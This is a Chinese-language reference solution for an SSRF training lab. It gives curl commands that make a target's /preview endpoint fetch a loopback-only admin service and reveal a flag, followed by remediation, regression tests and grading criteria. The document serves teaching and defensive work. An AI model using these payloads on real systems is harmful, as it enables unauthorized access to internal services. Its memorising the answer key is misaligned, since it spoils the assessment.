# SSRF 与内部服务访问边界 · 参考解答

## 目标与实现边界

靶机的 Web 服务监听 8000，另一个教学管理服务只绑定**靶机自身的** `127.0.0.1:9000`。`/preview` 会从服务器侧请求 URL 并展示响应。它把演示范围限制为 HTTP、127.0.0.1/localhost 和 9000 端口，因此本实验不访问外网、真实云元数据或其他内网服务。

## 复现步骤

### 1. 比较直接访问边界

在 Kali 终端尝试用靶机的实验 IP 直接访问 9000，设置短超时：

```bash
TARGET='http://TARGET_IP:8000'
curl --noproxy '*' --connect-timeout 2 --max-time 3 'http://TARGET_IP:9000/'
```

预期连接失败或超时。不要在 Kali 地址栏访问 `127.0.0.1:9000` 来替代这项比较，那指向的是 Kali 自己。

### 2. 让靶机代为访问其内部服务

在预览表单填 `http://127.0.0.1:9000/`，或执行：

```bash
curl -sS --get "$TARGET/preview" --data-urlencode 'url=http://127.0.0.1:9000/'
```

预期正文包含 `Internal service: /admin`。此时请求由靶机发起，它的回环地址才指向内部管理服务。

### 3. 读取内部管理路径

```bash
curl -sS --get "$TARGET/preview" --data-urlencode 'url=http://127.0.0.1:9000/admin'
```

预期预览结果展示本次 Flag，记录直接请求与服务器代理请求的区别，然后提交 Flag。

## 常见失败与解释

预览 URL 的端口必须是 9000，业务入口是当前靶机的 8000。`/admin` 在内部服务上，不能仅访问 `http://TARGET_IP:8000/admin`。目标不符合教学限制时返回 400；内部请求失败时可能返回 502。

仅证明直连失败不能证明 SSRF；仅提交预览参数也不能证明服务器成功访问内部资源。需要同时核实访问边界及返回内容。此教学允许列表故意允许一个敏感回环服务用于演示，不能把它当成生产安全配置。

## 修复思路与回归

根据业务目的设置允许的目标服务，校验协议、主机、端口、解析后的实际连接地址以及重定向后的目标；实施出站网络隔离。内部管理服务还应独立认证，不能只依赖“仅监听回环”。

回归：正常批准的预览目标仍可访问；回环、未批准内网目标和重定向到禁止地址的情况被拒绝；内部服务无有效认证时不返回敏感内容。DNS 变化等是生产方案需要额外验证的问题，不声称本实验已经覆盖。

## 本实验评估要点

要求清楚区分 Kali、靶机 Web 服务和靶机内部服务三个位置，说明请求由谁发起。证据应包含有界直连测试、预览内部提示、管理路径结果。若只有 curl 提交记录而没有返回值/截图/判题结果，保持“尝试已记录、结果待核实”的判断。
